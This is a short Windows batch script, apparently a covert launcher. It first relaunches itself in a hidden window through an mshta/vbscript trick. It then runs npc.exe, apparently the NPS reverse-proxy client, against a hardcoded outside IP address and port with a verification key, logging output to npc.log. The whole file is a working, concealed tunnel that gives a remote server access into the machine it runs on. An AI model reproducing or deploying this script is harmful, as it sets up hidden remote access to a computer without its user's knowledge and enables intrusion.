if "%1"=="hide" goto CmdBegin
start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit
:CmdBegin
npc.exe -server=120.79.123.194:55601 -vkey=y23gpqfb25s398iy -type=tcp >> .\npc.log 2>&1